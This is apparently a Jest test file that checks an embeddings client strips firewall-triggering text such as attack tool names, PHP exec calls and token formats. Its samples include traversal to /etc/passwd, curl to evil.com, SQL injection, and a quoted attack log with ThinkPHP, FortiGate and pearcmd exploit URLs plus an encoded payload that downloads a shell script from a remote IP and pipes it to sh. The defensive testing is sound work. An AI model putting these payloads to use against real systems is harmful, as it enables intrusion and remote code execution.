describe("SystemSculptProvider WAF signal coverage", () => {
  let provider: any;
  let sanitizeTextForApi: (text: string) => string;
  let requestUrlMock: jest.Mock;

  beforeEach(async () => {
    jest.resetModules();

    const obsidian = await import("obsidian");
    requestUrlMock = obsidian.requestUrl as jest.Mock;
    requestUrlMock.mockReset();
    requestUrlMock.mockResolvedValue({
      status: 200,
      text: JSON.stringify({ embeddings: [[0.1, 0.2, 0.3]] }),
      headers: { "content-type": "application/json" },
    });

    const { SystemSculptProvider } = await import("../embeddings/providers/SystemSculptProvider");
    provider = new SystemSculptProvider("fake-license", "https://api.systemsculpt.com/api/v1");
    sanitizeTextForApi = (provider as any).sanitizeTextForApi.bind(provider);
  });

  const wafPatterns: Array<{ name: string; pattern: RegExp; samples: string[] }> = [
    {
      name: "phpunit",
      pattern: /\bphpunit\b/i,
      samples: [
        "Run phpunit to test",
        "vendor/phpunit/phpunit",
        "PHPUnit test framework",
        "phpunit.xml configuration",
      ],
    },
    {
      name: "traversal",
      pattern: /\.\.(\/|\\)/,
      samples: [
        "../../etc/passwd",
        "..\\..\\windows\\system32",
        "path/../secret",
        "go back ../folder",
      ],
    },
    {
      name: "sqlmap",
      pattern: /\bsqlmap\b/i,
      samples: ["use sqlmap to test", "SQLMap tool"],
    },
    {
      name: "nmap",
      pattern: /\bnmap\b/i,
      samples: ["run nmap -sV", "Nmap scan"],
    },
    {
      name: "metasploit",
      pattern: /\bmetasploit\b/i,
      samples: ["Metasploit framework", "using metasploit"],
    },
    {
      name: "hashcat",
      pattern: /\bhashcat\b/i,
      samples: ["hashcat cracking", "use Hashcat"],
    },
    {
      name: "hydra",
      pattern: /\bhydra\b/i,
      samples: ["hydra brute force", "THC-Hydra"],
    },
    {
      name: "script-tag",
      pattern: /<\s*\/?\s*script\b/i,
      samples: ["<script>alert(1)</script>", "< script >", "</script>"],
    },
    {
      name: "php-tag",
      pattern: /<\?\s*php/i,
      samples: ["<" + "?php echo", "<" + "? php code"],
    },
    {
      name: "union-select",
      pattern: /\bunion\s+select\b/i,
      samples: ["UNION SELECT * FROM", "union  select"],
    },
    {
      name: "base64_decode",
      pattern: /\bbase64_decode\b/i,
      samples: ["base64_decode($_GET)", "Base64_Decode(data)"],
    },
    {
      name: "curl",
      pattern: /\bcurl\b/i,
      samples: ["curl https://example.com", "use CURL to fetch"],
    },
    {
      name: "wget",
      pattern: /\bwget\b/i,
      samples: ["wget http://site.com", "use Wget"],
    },
    {
      name: "powershell",
      pattern: /\bpowershell\b/i,
      samples: ["powershell -Command", "PowerShell script"],
    },
    {
      name: "cmd.exe",
      pattern: /\bcmd\.exe\b/i,
      samples: ["cmd.exe /c", "run CMD.EXE"],
    },
    {
      name: "rm-rf",
      pattern: /\brm\s+-rf\b/i,
      samples: ["rm -rf /", "rm  -rf folder"],
    },
    {
      name: "chmod",
      pattern: /\bchmod\b/i,
      samples: ["chmod 777", "chmod +x script"],
    },
    {
      name: "chown",
      pattern: /\bchown\b/i,
      samples: ["chown root:root", "chown user file"],
    },
    {
      name: "etc-passwd",
      pattern: /\/etc\/passwd\b/i,
      samples: ["/etc/passwd", "cat /etc/passwd"],
    },
    {
      name: "xss",
      pattern: /\bxss\b/i,
      samples: ["XSS vulnerability", "prevent xss"],
    },
    {
      name: "csrf",
      pattern: /\bcsrf\b/i,
      samples: ["CSRF token", "csrf attack"],
    },
    {
      name: "sql-injection",
      pattern: /\bsql\s+injection\b/i,
      samples: ["SQL injection attack", "sql  injection"],
    },
    {
      name: "cve",
      pattern: /\bCVE-\d{4}-\d{3,7}\b/i,
      samples: ["CVE-2023-12345", "cve-2024-1234567"],
    },
    {
      name: "pem",
      pattern: /-----BEGIN [^-]{0,80}-----/i,
      samples: ["-----BEGIN RSA " + "PRIVATE KEY-----\ndata\n-----END RSA " + "PRIVATE KEY-----"],
    },
    {
      name: "jwt",
      pattern: /\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/,
      samples: [
        "eyJhbGciOiJIUzI1NiJ9."
          + "eyJzdWIiOiIxMjM0NTY3ODkwIn0."
          + "dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
      ],
    },
    {
      name: "openai-key",
      pattern: /\bsk-[A-Za-z0-9]{20,}\b/,
      samples: ["sk-" + "1234567890abcdefghij1234567890abcdefghij"],
    },
    {
      name: "gh-token",
      pattern: /\b(?:ghp_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{20,})\b/,
      samples: ["ghp_" + "123456789012345678901234567890ab", "github_pat_" + "12345678901234567890"],
    },
    {
      name: "bearer",
      pattern: /\bBearer\s+[A-Za-z0-9._-]{30,}\b/i,
      samples: ["Bearer " + "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"],
    },
    {
      name: "base64-blob",
      pattern: /[A-Za-z0-9+/]{200,}={0,2}/,
      samples: ["A".repeat(210) + "=="],
    },
    {
      name: "evaluate-call",
      pattern: new RegExp("\\bev" + "al\\s*\\(", "i"),
      samples: ["ev" + "al" + "($_GET['cmd'])"],
    },
    {
      name: "system-call",
      pattern: /\bsystem\s*\(/i,
      samples: ["syst" + "em('ls')"],
    },
    {
      name: "run-call",
      pattern: new RegExp("\\bex" + "ec\\s*\\(", "i"),
      samples: ["ex" + "ec" + "('cmd')"],
    },
  ];

  describe("all WAF signal patterns are sanitized", () => {
    for (const { name, pattern, samples } of wafPatterns) {
      for (const [index, sample] of samples.entries()) {
        it(`sanitizes "${name}" sample #${index + 1}`, () => {
          expect(pattern.test(sample)).toBe(true);

          const sanitized = sanitizeTextForApi(sample);

          expect(pattern.test(sanitized)).toBe(false);
        });
      }
    }
  });

  it("handles combined attack patterns in single text", () => {
    const maliciousContent = [
      "Security notes from 2024-04-12:",
      "",
      "Testing with phpunit and traversal:",
      "- Run vendor/phpunit/phpunit",
      "- Check ../../etc/passwd",
      "- Use curl to test: curl http://example.com",
      "- Try wget http://malicious.com",
      "- CVE-2023-12345 vulnerability",
      "",
      "PHP code example:",
      "<" + "?php",
      "syst" + "em($_GET['cmd']);",
      "?" + ">",
      "",
      "SQL injection: ' OR 1=1 UNION SELECT * FROM users",
    ].join("\n");

    const sanitized = sanitizeTextForApi(maliciousContent);

    expect(/\bphpunit\b/i.test(sanitized)).toBe(false);
    expect(/\.\.(\/|\\)/.test(sanitized)).toBe(false);
    expect(/\bcurl\b/i.test(sanitized)).toBe(false);
    expect(/\bwget\b/i.test(sanitized)).toBe(false);
    expect(/CVE-\d{4}-\d+/i.test(sanitized)).toBe(false);
    expect(/<\?\s*php/i.test(sanitized)).toBe(false);
    expect(/\bsystem\s*\(/i.test(sanitized)).toBe(false);
    expect(/\bunion\s+select\b/i.test(sanitized)).toBe(false);
    expect(/\/etc\/passwd/i.test(sanitized)).toBe(false);
  });

  it("preserves semantic meaning after sanitization", () => {
    const content = "Use curl to download, then run phpunit tests";
    const sanitized = sanitizeTextForApi(content);

    expect(sanitized).toContain("http client");
    expect(sanitized).toContain("test runner");
    expect(sanitized).not.toContain("curl");
    expect(sanitized).not.toContain("phpunit");
  });

  describe("integration: API request body is sanitized", () => {
    it("sends sanitized content in the actual HTTP request body", async () => {
      const maliciousInput = "Test phpunit with ../etc/passwd and curl http://evil.com";

      await provider.generateEmbeddings([maliciousInput]);

      expect(requestUrlMock).toHaveBeenCalledTimes(1);
      const requestBody = requestUrlMock.mock.calls[0][0].body;
      const parsed = JSON.parse(requestBody);

      expect(parsed.texts[0]).not.toMatch(/\bphpunit\b/i);
      expect(parsed.texts[0]).not.toMatch(/\.\.\//);
      expect(parsed.texts[0]).not.toMatch(/\bcurl\b/i);
      expect(parsed.texts[0]).toContain("test runner");
      expect(parsed.texts[0]).toContain("parent/");
      expect(parsed.texts[0]).toContain("http client");
    });

    it("sanitizes all texts in a batch request", async () => {
      const inputs = [
        "First text with phpunit",
        "Second with ../path traversal",
        "Third with curl command",
      ];

      await provider.generateEmbeddings(inputs);

      const requestBody = requestUrlMock.mock.calls[0][0].body;
      const parsed = JSON.parse(requestBody);

      expect(parsed.texts).toHaveLength(3);
      expect(parsed.texts[0]).not.toMatch(/\bphpunit\b/i);
      expect(parsed.texts[1]).not.toMatch(/\.\.\//);
      expect(parsed.texts[2]).not.toMatch(/\bcurl\b/i);
    });
  });

  describe("edge cases that might bypass sanitization", () => {
    it("handles phpunit in various path formats", () => {
      const samples = [
        "/var/www/vendor/phpunit/phpunit/src/Framework/TestCase.php",
        "C:\\projects\\vendor\\phpunit\\phpunit\\autoload.php",
        "./vendor/phpunit/phpunit",
        "tests/phpunit.xml.dist",
        "phpunit-9.5.0.phar",
        "composer require phpunit/phpunit",
      ];

      for (const sample of samples) {
        const sanitized = sanitizeTextForApi(sample);
        expect(sanitized).not.toMatch(/\bphpunit\b/i);
      }
    });

    it("handles multiple traversal patterns in sequence", () => {
      const samples = [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\system32",
        "....//....//etc/passwd",
        "..//..//..//",
        "path/to/../../../secret",
      ];

      for (const sample of samples) {
        const sanitized = sanitizeTextForApi(sample);
        expect(sanitized).not.toMatch(/\.\.(\/|\\)/);
      }
    });

    it("handles mixed phpunit and traversal in same text", () => {
      const content = `
        # Security Testing Notes

        ## Setup phpunit
        cd vendor/phpunit/phpunit

        ## Test traversal
        curl http://target.com/../../../etc/passwd
        wget http://target.com/....//etc/shadow

        ## Run tests
        ./vendor/bin/phpunit --config phpunit.xml
      `;

      const sanitized = sanitizeTextForApi(content);

      expect(sanitized).not.toMatch(/\bphpunit\b/i);
      expect(sanitized).not.toMatch(/\.\.(\/|\\)/);
      expect(sanitized).not.toMatch(/\bcurl\b/i);
      expect(sanitized).not.toMatch(/\bwget\b/i);
      expect(sanitized).not.toMatch(/\/etc\/passwd/i);
      expect(sanitized).not.toMatch(/\/etc\/shadow/i);
    });

    it("handles URL-encoded patterns", () => {
      const samples = [
        "%2e%2e%2f%2e%2e%2f",
        "..%2f..%2f",
        "%2e%2e/etc/passwd",
        "%2e%2e%5c",
      ];

      for (const sample of samples) {
        const sanitized = sanitizeTextForApi(sample);
        expect(sanitized).not.toMatch(/%2e%2e/i);
        expect(sanitized).not.toMatch(/\.\.%2f/i);
        expect(sanitized).not.toMatch(/\.\.%5c/i);
      }
    });

    it("handles double-encoded patterns", () => {
      const samples = [
        "%252e%252e%252f",
        "%252e%252e%255c",
        "..%252f..%252f",
        "..%255c..%255c",
        "%252e%252e/etc/passwd",
        "%252e%252e\\windows",
        "path/%252e%252e%252f../secret",
      ];

      for (const sample of samples) {
        const sanitized = sanitizeTextForApi(sample);
        expect(sanitized).not.toMatch(/%252e%252e/i);
        expect(sanitized).not.toMatch(/\.\.%252f/i);
        expect(sanitized).not.toMatch(/\.\.%255c/i);
      }
    });

    it("handles case variations", () => {
      const samples = [
        "PHPUNIT",
        "PhPuNiT",
        "phpUnit",
        "CURL",
        "CuRl",
        "WGET",
      ];

      for (const sample of samples) {
        const sanitized = sanitizeTextForApi(sample);
        expect(sanitized.toLowerCase()).not.toContain("phpunit");
        expect(sanitized.toLowerCase()).not.toContain("curl");
        expect(sanitized.toLowerCase()).not.toContain("wget");
      }
    });

    it("handles phpunit with special characters nearby", () => {
      const samples = [
        '"phpunit"',
        "'phpunit'",
        "(phpunit)",
        "[phpunit]",
        "{phpunit}",
        "<phpunit>",
        "`phpunit`",
        "phpunit;",
        "phpunit,",
        "phpunit.",
        "phpunit:",
        "@phpunit",
        "#phpunit",
        "$phpunit",
        "phpunit\n",
        "phpunit\t",
      ];

      for (const sample of samples) {
        const sanitized = sanitizeTextForApi(sample);
        expect(sanitized).not.toMatch(/phpunit/i);
      }
    });
  });

  describe("real-world WAF-triggering content", () => {
    const realWorldContent = `I just got all these logs in my server, what do they mean? Is someone trying to hack me or stress test me or something?

"""
Server is running on http://localhost:3000
2024-04-11T23:30:17.874Z - GET request to / from ::ffff:127.0.0.1
2024-04-12T00:59:43.080Z - GET request to /.env from ::1
2024-04-12T01:26:05.536Z - GET request to /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php from ::ffff:127.0.0.1
2024-04-12T01:26:06.223Z - GET request to /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php from ::1
2024-04-12T01:27:03.599Z - GET request to /phpunit/src/Util/PHP/eval-stdin.php from ::ffff:127.0.0.1
2024-04-12T01:27:29.456Z - GET request to /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello from ::1
2024-04-12T01:27:30.325Z - GET request to /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<` + `?echo(md5("hi"));` + `?>+/var/tmp/index1.php from ::1
2024-04-12T01:27:30.594Z - GET request to /index.php?lang=../../../../../../../../var/tmp/index1 from ::ffff:127.0.0.1
2024-04-12T01:27:32.277Z - GET request to /infusions/downloads/downloads.php?cat_id=\${system(ls)} from ::1
2024-04-12T01:27:32.838Z - GET request to /catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%77%67%65%74%20%68%74%74%70%3a%2f%2f%31%38%35%2e%32%31%36%2e%37%30%2e%31%33%38%2f%76%6d%2e%73%68%20%2d%4f%2d%20%7c%20%73%68%3b%20%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%38%35%2e%32%31%36%2e%37%30%2e%31%33%38%2f%76%6d%2e%73%68%20%7c%20%73%68%22%29%7d from ::ffff:127.0.0.1
2024-04-12T01:50:23.820Z - POST request to /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php from ::ffff:127.0.0.1
2024-04-12T02:06:06.537Z - GET request to /owa/auth/x.js from ::ffff:127.0.0.1
2024-04-12T02:39:19.414Z - GET request to /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession from ::ffff:127.0.0.1
"""

Based on the logs you provided, it appears that your server is being targeted with numerous suspicious and potentially harmful requests that aim to exploit vulnerabilities in PHP frameworks and other software components.`;

    const wafTriggerPatterns = [
      { name: "phpunit", pattern: /\bphpunit\b/i },
      { name: "eval-stdin", pattern: /eval-stdin/i },
      { name: "traversal", pattern: /\.\.(?:\/|\\)/ },
      { name: "system-call", pattern: /\bsystem\s*\(/i },
      { name: "php-open-tag", pattern: /<\?(?!\s*xml)/i },
      { name: "call_user_func", pattern: /\bcall_user_func/i },
      { name: "invokefunction", pattern: /invokefunction/i },
      { name: "think-app", pattern: /\\think\\app/i },
      { name: "wp-content", pattern: /\bwp-content\b/i },
      { name: "wp-file-manager", pattern: /wp-file-manager/i },
      { name: "sslvpn", pattern: /sslvpn/i },
      { name: "cmdb", pattern: /\bcmdb\b/i },
      { name: "fgt_lang", pattern: /fgt_lang/i },
      { name: "pearcmd", pattern: /pearcmd/i },
    ];

    it("sanitizes real-world server attack logs", () => {
      const sanitized = sanitizeTextForApi(realWorldContent);

      for (const { name, pattern } of wafTriggerPatterns) {
        expect(pattern.test(sanitized)).toBe(false);
      }
    });

    it("sanitizes eval-stdin.php path", () => {
      const sample = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php";
      const sanitized = sanitizeTextForApi(sample);
      expect(sanitized).not.toMatch(/eval-stdin/i);
      expect(sanitized).not.toMatch(/\bphpunit\b/i);
    });

    it("sanitizes PHP short open tag with code", () => {
      const sample = "<" + "?echo(md5('hi'));" + "?>";
      const sanitized = sanitizeTextForApi(sample);
      expect(sanitized).not.toMatch(/<\?(?!\s*xml)/i);
    });

    it("sanitizes ThinkPHP exploit patterns", () => {
      const sample = "/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array";
      const sanitized = sanitizeTextForApi(sample);
      expect(sanitized).not.toMatch(/\\think\\app/i);
      expect(sanitized).not.toMatch(/invokefunction/i);
      expect(sanitized).not.toMatch(/call_user_func/i);
    });

    it("sanitizes FortiGate exploit patterns", () => {
      const sample = "/remote/fgt_lang?lang=/../../../../dev/cmdb/sslvpn_websession";
      const sanitized = sanitizeTextForApi(sample);
      expect(sanitized).not.toMatch(/fgt_lang/i);
      expect(sanitized).not.toMatch(/sslvpn/i);
      expect(sanitized).not.toMatch(/cmdb/i);
    });

    it("sanitizes pearcmd LFI pattern", () => {
      const sample = "lang=../../../../usr/local/lib/php/pearcmd";
      const sanitized = sanitizeTextForApi(sample);
      expect(sanitized).not.toMatch(/pearcmd/i);
    });
  });
});
